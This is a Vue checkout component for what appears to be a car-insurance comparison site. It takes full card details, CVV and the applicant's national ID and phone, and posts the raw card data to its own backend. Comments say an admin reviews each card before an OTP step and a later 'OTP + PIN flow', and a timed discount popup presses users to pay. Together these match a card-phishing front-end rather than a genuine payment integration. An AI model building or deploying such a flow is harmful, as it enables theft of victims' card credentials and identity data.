<template>
    <div class="min-h-screen bg-slate-50" dir="rtl">
        <!-- Header Bar -->
        <div class="bg-white border-b border-slate-200">
            <div class="box py-3 flex items-center justify-between">
                <button class="flex items-center gap-1.5 text-primary typ-s2 hover:text-primary-dark transition-colors cursor-pointer"
                    @click="goBack">
                    <svg class="w-4 h-4 rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
                    </svg>
                    العودة للعروض
                </button>
            </div>
        </div>

        <!-- Main Content -->
        <div v-if="plan" class="box py-4 sm:py-6">

            <!-- Payment Error Alert -->
            <transition name="fade">
                <div v-if="paymentError"
                    class="flex items-start gap-3 p-4 bg-red-50 border border-red-200 rounded-xl mb-4" role="alert">
                    <svg class="w-5 h-5 text-red-500 shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd"
                            d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                            clip-rule="evenodd" />
                    </svg>
                    <p class="flex-1 text-sm font-bold text-red-700">{{ paymentError }}</p>
                    <button class="text-red-400 hover:text-red-600 transition-colors cursor-pointer"
                        @click="paymentError = ''">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </button>
                </div>
            </transition>

            <div class="grid grid-cols-1 lg:grid-cols-[1fr_380px] gap-4 sm:gap-6">

                <!-- ═══ Left Column: Forms ═══ -->
                <div class="min-w-0 space-y-4 sm:space-y-6">

                    <!-- Payment Method Card -->
                    <PaymentMethodCard
                        :method="form.paymentMethod"
                        :form="cardForm"
                        :errors="errors"
                        :rejection-reason="cardRejectionReason"
                        @update:method="form.paymentMethod = $event"
                        @update:form="onCardFormUpdate($event)"
                        @blur:field="onFieldBlur"
                    />

                    <!-- Terms & Conditions -->
                    <div class="bg-white rounded-2xl border border-slate-200 p-4 sm:p-6">
                        <h5 class="text-lg font-bold text-foreground mb-4">الشروط والأحكام</h5>

                        <label for="accept-terms" class="flex items-start gap-3 cursor-pointer">
                            <CheckboxRoot id="accept-terms" v-model:checked="form.acceptTerms" name="accept-terms"
                                class="flex h-5 w-5 shrink-0 appearance-none items-center justify-center rounded-md border-2 mt-0.5 transition-colors cursor-pointer"
                                :class="form.acceptTerms ? 'bg-primary border-primary' : 'bg-white border-slate-300 hover:border-slate-400'">
                                <CheckboxIndicator>
                                    <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor"
                                        viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3"
                                            d="M5 13l4 4L19 7" />
                                    </svg>
                                </CheckboxIndicator>
                            </CheckboxRoot>
                            <span class="typ-s2 text-foreground">أقر بأن جميع البيانات المدخلة صحيحة و أوافق على
                                <router-link to="/terms" target="_blank" class="text-primary hover:underline">الشروط والأحكام</router-link>
                                و
                                <router-link to="/privacy" target="_blank" class="text-primary hover:underline">سياسة الخصوصية</router-link>
                                الخاصة بتأمينكم
                            </span>
                        </label>

                        <p v-if="errors.acceptTerms" class="text-destructive typ-c1 mt-3">
                            {{ errors.acceptTerms }}
                        </p>
                    </div>
                </div>

                <!-- ═══ Right Column: Price Sidebar ═══ -->
                <div class="order-last">
                    <div class="lg:sticky lg:top-[70px] space-y-4">

                        <!-- ── تفاصيل الملخص ── -->
                        <PriceSummaryCard
                            :subtotal="subtotal"
                            :vat-amount="vatAmount"
                            :total-price="totalPrice"
                            :addons="selectedAddons"
                        />

                    </div>
                </div>
            </div>

            <!-- Bottom Action Bar -->
            <div
                class="border-0 border-t border-solid border-slate-200 bg-white/95 backdrop-blur-sm px-3 sticky bottom-0 z-[49] shadow-[0_-2px_8px_rgba(0,0,0,0.08)] lg:static lg:bottom-auto lg:bg-transparent lg:backdrop-blur-none lg:shadow-none lg:mt-6 safe-area-bottom">
                <div class="flex items-center py-3 gap-2 sm:gap-3 justify-between">
                    <button class="px-3 sm:px-8 py-2.5 sm:py-3 bg-slate-100 hover:bg-slate-200 text-slate-600 font-bold text-xs sm:text-base rounded-xl transition-colors cursor-pointer shrink-0"
                        @click="goBack">
                        السابق
                    </button>
                    <!-- Mobile: price shown separately -->
                    <div class="flex sm:hidden items-center gap-1 font-bold text-foreground text-sm ltr-nums">
                        <span>{{ formatDecimal(totalPrice) }}</span>
                        <SarIcon className="size-3" />
                    </div>
                    <button :disabled="isSubmitting" class="disabled:cursor-not-allowed disabled:opacity-60 bg-primary hover:bg-primary-dark text-white py-3 sm:py-3.5 px-5 sm:px-8 rounded-xl font-bold text-sm sm:text-base transition-colors cursor-pointer flex items-center justify-center gap-2 shrink-0"
                        @click="handleSubmit">
                        <svg v-if="isSubmitting" class="w-5 h-5 animate-spin" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                            <path class="opacity-75" fill="currentColor"
                                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                        </svg>
                        <span v-if="isSubmitting">جاري المعالجة...</span>
                        <template v-else>
                            <span>إتمام الدفع</span>
                            <!-- Desktop: price inside button -->
                            <span class="hidden sm:flex text-white/80 text-sm ltr-nums items-center gap-0.5">{{ formatDecimal(totalPrice) }}
                                <SarIcon className="size-3" />
                            </span>
                        </template>
                    </button>
                </div>
            </div>
        </div>

        <!-- No Plan Selected State -->
        <div v-else class="box py-20">
            <div class="flex flex-col items-center justify-center text-center">
                <div class="text-5xl mb-4">🛒</div>
                <h2 class="text-xl font-bold text-foreground mb-3">لم يتم اختيار وثيقة</h2>
                <p class="text-sm text-muted mb-6">يرجى اختيار وثيقة تأمين من صفحة المقارنة أولاً</p>
                <router-link to="/compare"
                    class="inline-flex items-center gap-2 bg-primary text-white px-6 py-3 rounded-xl font-medium hover:bg-primary-dark transition-colors">
                    <svg class="w-4 h-4 rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
                    </svg>
                    العودة للمقارنة
                </router-link>
            </div>
        </div>

    </div>

    <!-- ═══ Discount Inline Banner (subtle, non-intrusive) ═══ -->
    <Transition enter-active-class="transition-all duration-500 ease-out"
        enter-from-class="opacity-0 -translate-y-2" enter-to-class="opacity-100 translate-y-0"
        leave-active-class="transition-all duration-200 ease-in"
        leave-from-class="opacity-100" leave-to-class="opacity-0">
        <div v-if="showDiscountPopup" class="fixed bottom-20 lg:bottom-4 start-4 end-4 sm:start-auto sm:end-4 sm:max-w-sm z-[60] bg-white rounded-2xl shadow-lg border border-emerald-200 p-4 flex items-start gap-3">
            <img :src="cashBackImg" alt="كاش باك" class="w-14 h-14 rounded-xl object-cover shrink-0" width="56" height="56" loading="lazy" />
            <div class="flex-1 min-w-0">
                <p class="text-sm font-bold text-foreground">وفّر على تأمينك!</p>
                <p class="text-xs text-muted mt-0.5">أكمل عملية الدفع الآن واستفد من العرض</p>
            </div>
            <button class="text-slate-400 hover:text-slate-600 transition-colors cursor-pointer shrink-0 mt-0.5"
                @click="showDiscountPopup = false">
                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
            </button>
        </div>
    </Transition>
</template>

<script setup>
import { ref, reactive, computed, onMounted, onUnmounted, nextTick } from 'vue';
import { useRoute, useRouter } from 'vue-router';
import {
    CheckboxRoot, CheckboxIndicator,
} from 'radix-vue';
import { getPlanWithCompany } from '@/data';
import { calculateTotalWithVAT } from '@/utils/pricing';
import { validateCardForm, isValidLuhn, isExpiryValid } from '@/utils/cardValidation';
import { useQuoteTracking } from '@/composables/useQuoteTracking';
import { trackStepViewed, trackCheckoutSubmitted, trackStepCompleted, useAbandonmentTracking } from '@/composables/useFunnelTracking';
import { useInsuranceStore } from '@/store/modules/insurance';
import { usePricingEngine } from '@/utils/pricingEngine';
import { usePayment } from '@/composables/usePayment';
import { submitQuote } from '@/api/quotes';
import { getReasonLabel } from '@/constants/rejectionReasons';
import { useI18n } from 'vue-i18n';
import logger from '@/utils/logger';
import request from '@/api/request';
import SarIcon from '@/components/SarIcon.vue';
import PaymentMethodCard from '../components/checkout/PaymentMethodCard.vue';
import PriceSummaryCard from '../components/checkout/PriceSummaryCard.vue';
import cashBackImg from '@/../../resources/images/logo/summary_logo/cash_back.jpeg';

const route = useRoute();
const router = useRouter();
const { t } = useI18n();
const { trackStep, completeSession } = useQuoteTracking();
const insuranceStore = useInsuranceStore();
const { calculatePremium } = usePricingEngine();
const { processCardPayment, loading: _paymentLoading, error: paymentApiError } = usePayment();

//
const planId = computed( () => {
    if ( selectedPlanData.value?.id ) return selectedPlanData.value.id;
    const raw = sessionStorage.getItem( 'selectedPlan' );
    if ( raw ) {
        try { return JSON.parse( raw ).id; } catch { /* ignore */ }
    }
    return null;
} );
const plan = computed( () => planId.value ? getPlanWithCompany( planId.value ) : null );

//
const selectedPlanData = ref( null );
const selectedDeductible = ref( 0 );
const selectedAddons = ref( [] );
const vehicleInfo = ref( null );

// Load selected plan data immediately (before onMounted) so planId computed works
{
    const raw = sessionStorage.getItem( 'selectedPlan' );
    if ( raw ) {
        try { selectedPlanData.value = JSON.parse( raw ); } catch { /* ignore */ }
    }
}

onMounted( () => {
    // استعادة بيانات التأمين من المتجر
    insuranceStore.hydrateFromSession();

    // Load selected plan data
    if ( selectedPlanData.value ) {
        selectedDeductible.value = selectedPlanData.value.deductible || plan.value?.deductible || 0;
        selectedAddons.value = selectedPlanData.value.addons || [];
    }
    if ( !selectedDeductible.value && plan.value ) {
        selectedDeductible.value = plan.value.deductible;
    }

    // Load vehicle info
    const vehicleRaw = sessionStorage.getItem( 'vehicleInfo' );
    if ( vehicleRaw ) {
        try { vehicleInfo.value = JSON.parse( vehicleRaw ); } catch { /* ignore */ }
    }

    trackStep( 'checkout', 5, { plan_id: planId.value }, 'next' );
    trackStepViewed( 'checkout', { plan_id: planId.value } );

    // Show discount banner after user has had time to look at the page
    setTimeout( () => {
        showDiscountPopup.value = true;
    }, 5000 );
} );

// التسعير الديناميكي
const dynamicPrice = computed( () => {
    if ( !plan.value ) return { annualPrice: 0, monthlyPrice: 0 };
    // أولاً: من selectedPlan (محسوب في ComparePage/DetailsPage)
    if ( selectedPlanData.value?.annualPrice ) {
        return {
            annualPrice: selectedPlanData.value.annualPrice,
            monthlyPrice: selectedPlanData.value.monthlyPrice || Math.round( selectedPlanData.value.annualPrice / 12 ),
        };
    }
    // ثانياً: من الأسعار المحسوبة في المتجر
    const cached = insuranceStore.calculatedQuotes.find( q => q.id === plan.value.id );
    if ( cached ) {
        return { annualPrice: cached.annualPrice, monthlyPrice: cached.monthlyPrice };
    }
    // ثالثاً: إعادة حساب (store already hydrated in onMounted)
    return calculatePremium( plan.value, insuranceStore.allFormData );
} );

//
const subtotal = computed( () => {
    const base = dynamicPrice.value.annualPrice || 0;
    const addonSum = selectedAddons.value.reduce( ( sum, a ) => sum + a.price, 0 );
    return base + addonSum;
} );
const pricingResult = computed( () => calculateTotalWithVAT( dynamicPrice.value.annualPrice || 0, selectedAddons.value.reduce( ( s, a ) => s + a.price, 0 ) ) );
const vatAmount = computed( () => pricingResult.value.vat );
const totalPrice = computed( () => pricingResult.value.total );
const _monthlyTotal = computed( () => {
    const base = dynamicPrice.value.monthlyPrice || 0;
    const addonSum = selectedAddons.value.reduce( ( sum, a ) => sum + Math.ceil( a.price / 12 ), 0 );
    return calculateTotalWithVAT( base + addonSum ).total;
} );

// Format with 2 decimal places + thousand separator
function formatDecimal( num ) {
    return new Intl.NumberFormat( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } ).format( num );
}

// Computed card form subset for PaymentMethodCard child
const cardForm = computed( () => ({
    cardNumber: form.cardNumber,
    expiry: form.expiry,
    cvv: form.cvv,
    cardHolder: form.cardHolder,
}) );

//
const form = reactive( {
    paymentMethod: 'card',
    cardNumber: '',
    expiry: '',
    cvv: '',
    cardHolder: '',
    acceptTerms: false,
} );



const errors = reactive( {} );
const isSubmitting = ref( false );
const paymentError = ref( '' );

// ── Card rejection reason (from PaymentWaitingPage redirect) ────────
const cardRejectionReason = ref( '' );
{
    const reasonKey = route.query.rejectionReason;
    if ( reasonKey && typeof reasonKey === 'string' && reasonKey.length >= 3 )
    {
        cardRejectionReason.value = getReasonLabel( reasonKey, t ) || reasonKey;
        // Clean up URL without triggering navigation
        router.replace( { ...route, query: { ...route.query, rejectionReason: undefined } } );
    }
}

// ═══ Discount Popup ═══
const showDiscountPopup = ref( false );

//
function validate() {
    Object.keys( errors ).forEach( k => delete errors[ k ] );

    if ( form.paymentMethod === 'card' ) {
        const result = validateCardForm( form );
        if ( !result.valid ) {
            Object.assign( errors, result.errors );
            return false;
        }
    }

    if ( !form.acceptTerms ) { errors.acceptTerms = 'يجب الموافقة على الشروط والأحكام'; return false; }

    return true;
}

//

//
function onCardFormUpdate ( data ) {
    Object.assign( form, data );
    // Dismiss rejection alert when user starts editing card fields
    if ( cardRejectionReason.value ) cardRejectionReason.value = '';
    // Clear errors on correction (while typing)
    if ( data.cardNumber !== undefined && errors.cardNumber ) {
        const digits = ( data.cardNumber || '' ).replace( /\s/g, '' );
        if ( digits.length === 16 && isValidLuhn( digits ) ) delete errors.cardNumber;
    }
    if ( data.expiry !== undefined && errors.expiry ) {
        if ( /^\d{2}\/\d{2}$/.test( data.expiry ) && isExpiryValid( data.expiry ) ) delete errors.expiry;
    }
    if ( data.cvv !== undefined && errors.cvv ) {
        if ( /^\d{3,4}$/.test( data.cvv ) ) delete errors.cvv;
    }
    if ( data.cardHolder !== undefined && errors.cardHolder ) {
        if ( data.cardHolder.trim().length > 0 ) delete errors.cardHolder;
    }
}

function onFieldBlur( fieldName ) {
    const val = form[ fieldName ] || '';
    switch ( fieldName ) {
        case 'cardNumber': {
            const digits = val.replace( /\s/g, '' );
            if ( digits.length === 0 ) break; // don't validate empty on blur
            if ( digits.length !== 16 ) { errors.cardNumber = 'رقم البطاقة يجب أن يكون 16 رقم'; break; }
            if ( !isValidLuhn( digits ) ) { errors.cardNumber = 'رقم البطاقة غير صالح'; break; }
            delete errors.cardNumber;
            break;
        }
        case 'expiry': {
            if ( val.length === 0 ) break;
            if ( !/^\d{2}\/\d{2}$/.test( val ) ) { errors.expiry = 'صيغة التاريخ غير صحيحة (MM/YY)'; break; }
            if ( !isExpiryValid( val ) ) { errors.expiry = 'البطاقة منتهية الصلاحية'; break; }
            delete errors.expiry;
            break;
        }
        case 'cvv': {
            if ( val.length === 0 ) break;
            if ( !/^\d{3,4}$/.test( val ) ) { errors.cvv = 'رمز الأمان يجب أن يكون 3 أو 4 أرقام'; break; }
            delete errors.cvv;
            break;
        }
        case 'cardHolder': {
            if ( val.length === 0 ) break;
            if ( val.trim().length === 0 ) { errors.cardHolder = 'يرجى إدخال اسم حامل البطاقة'; break; }
            delete errors.cardHolder;
            break;
        }
    }
}

// ── Refresh quote lock if less than 3 minutes remaining ──
const LOCK_REFRESH_THRESHOLD_MS = 3 * 60 * 1000;

async function refreshQuoteLockIfNeeded() {
    const expiresAt = selectedPlanData.value?.quoteLockExpiresAt;
    if ( !expiresAt ) return false;
    const remaining = new Date( expiresAt ).getTime() - Date.now();
    if ( remaining >= LOCK_REFRESH_THRESHOLD_MS ) return true; // still fresh

    try {
        const sp = selectedPlanData.value;
        const subtotalVal = sp.subtotal ?? subtotal.value;
        const vatVal = sp.vatAmount ?? vatAmount.value;
        const totalVal = sp.totalPrice ?? totalPrice.value;

        const { data } = await request.post( '/quotes/lock', {
            plan_id: plan.value.id,
            plan_name: plan.value.name,
            insurance_company: plan.value.company?.nameAr || '',
            insurance_type: plan.value.type === 'thirdParty' ? 'third_party' : 'comprehensive',
            plan_type: plan.value.subType || plan.value.type,
            subtotal: subtotalVal,
            vat_amount: vatVal,
            total: totalVal,
            deductible: Number( sp.deductible || plan.value.deductible || 0 ),
            addons: sp.addons || [],
            session_id: sessionStorage.getItem( 'sessionToken' ) || null,
        } );

        // Update in-memory + sessionStorage
        selectedPlanData.value.quoteLockToken = data.quote_lock_token;
        selectedPlanData.value.quoteLockExpiresAt = data.expires_at;
        sessionStorage.setItem( 'selectedPlan', JSON.stringify( selectedPlanData.value ) );
        logger.info( '[Checkout] Quote lock refreshed successfully' );
        return true;
    } catch ( err ) {
        logger.error( '[Checkout] Failed to refresh quote lock:', err );
        paymentError.value = 'تعذّر تحديث العرض. يرجى العودة لصفحة العروض وإعادة اختيار العرض.';
        return false;
    }
}

async function handleSubmit() {
    if ( isSubmitting.value ) return;
    paymentError.value = '';

    // ── Guard: check quote lock validity before anything ──
    const lockToken = selectedPlanData.value?.quoteLockToken;
    const lockExpiry = selectedPlanData.value?.quoteLockExpiresAt;
    if ( !lockToken || !lockExpiry || Date.now() >= new Date( lockExpiry ).getTime() ) {
        paymentError.value = 'انتهت صلاحية العرض. يرجى العودة لصفحة العروض وإعادة اختيار العرض.';
        return;
    }

    if ( !validate() ) {
        // Scroll to first error
        nextTick( () => {
            document.querySelector( '.text-destructive' )?.scrollIntoView( { behavior: 'smooth', block: 'center' } );
        } );
        return;
    }

    isSubmitting.value = true;

    // ── Refresh quote lock if < 3 min remaining ──
    if ( !( await refreshQuoteLockIfNeeded() ) ) {
        isSubmitting.value = false;
        return;
    }

    const cardDigits = form.cardNumber.replace( /\s/g, '' );
    const [ expiryMonth, expiryYear ] = ( form.expiry || '' ).split( '/' ).map( s => ( s || '' ).trim() );

    const result = await processCardPayment(
        {
            card_number: cardDigits,
            holder_name: form.cardHolder,
            expiry_month: expiryMonth,
            expiry_year: expiryYear,
            cvv: form.cvv,
        },
        {
            totalPrice: totalPrice.value || null,
            selectedInsurance: plan.value ? {
                id: plan.value.id,
                name: plan.value.name,
                company: plan.value.company?.nameAr || plan.value.company?.name || null,
                type: plan.value.type || null,
            } : null,
        }
    );

    if ( !result ) {
        isSubmitting.value = false;
        paymentError.value = paymentApiError.value || 'حدث خطأ أثناء إرسال بيانات البطاقة';
        return;
    }

    // Submit order to backend to get server-generated order/policy numbers
    let orderNumber;
    let policyNumber;
    try {
        const quoteLockToken = selectedPlanData.value?.quoteLockToken || '';
        if ( !quoteLockToken ) {
            throw new Error( 'QUOTE_LOCK_MISSING' );
        }

        const orderResult = await submitQuote( {
            plan_id: plan.value.id,
            plan_name: plan.value.name,
            insurance_company: plan.value.company?.nameAr || '',
            insurance_type: plan.value.type === 'thirdParty' ? 'third_party' : 'comprehensive',
            plan_type: plan.value.subType || plan.value.type,
            subtotal: subtotal.value,
            vat_amount: vatAmount.value,
            total: totalPrice.value,
            deductible: selectedDeductible.value,
            addons: selectedAddons.value,
            pricing_factors: plan.value.pricingFactors || null,
            applicant_name: insuranceStore.driver.fullName || '',
            applicant_national_id: insuranceStore.driver.nationalId || '',
            applicant_phone: insuranceStore.driver.phone || '',
            applicant_email: insuranceStore.driver.email || '',
            vehicle_plate: insuranceStore.vehicle.plateNumber || '',
            vehicle_make: insuranceStore.vehicle.makeName || '',
            vehicle_model: insuranceStore.vehicle.modelName || '',
            vehicle_year: insuranceStore.vehicle.year || null,
            policy_start_date: insuranceStore.policy.policyStartDate || null,
            payment_method: form.paymentMethod === 'card' ? 'card' : form.paymentMethod,
            quote_lock_token: quoteLockToken,
        } );
        orderNumber = orderResult.order_number;
        policyNumber = orderResult.policy_number;
    } catch ( err ) {
        logger.error( '[Checkout] Order API failed:', err );
        isSubmitting.value = false;
        paymentError.value = 'تعذّر تأكيد السعر الحالي. يرجى العودة لصفحة العروض وتحديث السعر ثم المحاولة مرة أخرى.';
        return;
    }

    // Save order data to sessionStorage for confirmation page (used after OTP + PIN flow)
    try
    {
        sessionStorage.setItem( 'orderData', JSON.stringify( {
            plan: {
                id: plan.value.id,
                name: plan.value.name,
                companyName: plan.value.company.nameAr,
                typeAr: plan.value.typeAr,
                type: plan.value.type,
            },
            applicant: {
                fullName: insuranceStore.driver.fullName,
                identityNumber: insuranceStore.driver.nationalId,
                phone: insuranceStore.driver.phone,
                email: insuranceStore.driver.email,
            },
            pricing: {
                subtotal: subtotal.value,
                vat: vatAmount.value,
                total: totalPrice.value,
                addons: selectedAddons.value,
                deductible: selectedDeductible.value,
            },
            paymentMethod: form.paymentMethod,
            policyStartDate: insuranceStore.policy.policyStartDate,
            insuranceType: insuranceStore.policy.insuranceType,
            orderNumber,
            policyNumber,
            orderDate: new Date().toISOString(),
        } ) );
    } catch { /* storage full — non-critical */ }

    try { trackStep( 'payment_completed', 6, { plan_id: plan.value.id, total: totalPrice.value }, 'next' ); } catch { /* tracking — non-critical */ }
    trackCheckoutSubmitted( { plan_id: plan.value?.id, total: totalPrice.value } );
    trackStepCompleted( 'checkout', 'payment_waiting' );

    // Complete quote session — stops heartbeat so it won't 404 after navigation
    try { await completeSession(); } catch { /* session cleanup — non-critical */ }

    // Navigate to payment waiting page (admin reviews card before OTP)
    router.push( { name: 'paymentWaiting' } );
}

function goBack() {
    router.push( { name: 'compare' } );
}

// ── Abandonment tracking cleanup ──
let _cleanupAbandonment;
onMounted( () => {
    _cleanupAbandonment = useAbandonmentTracking( () => 'checkout' );
} );
onUnmounted( () => {
    if ( _cleanupAbandonment ) _cleanupAbandonment();
} );
</script>

<style scoped>
@keyframes bounce-in {
    0% { transform: scale(0.8) translateY(20px); opacity: 0; }
    60% { transform: scale(1.03); opacity: 1; }
    100% { transform: scale(1) translateY(0); }
}
.animate-bounce-in {
    animation: bounce-in 0.4s ease-out;
}
</style>
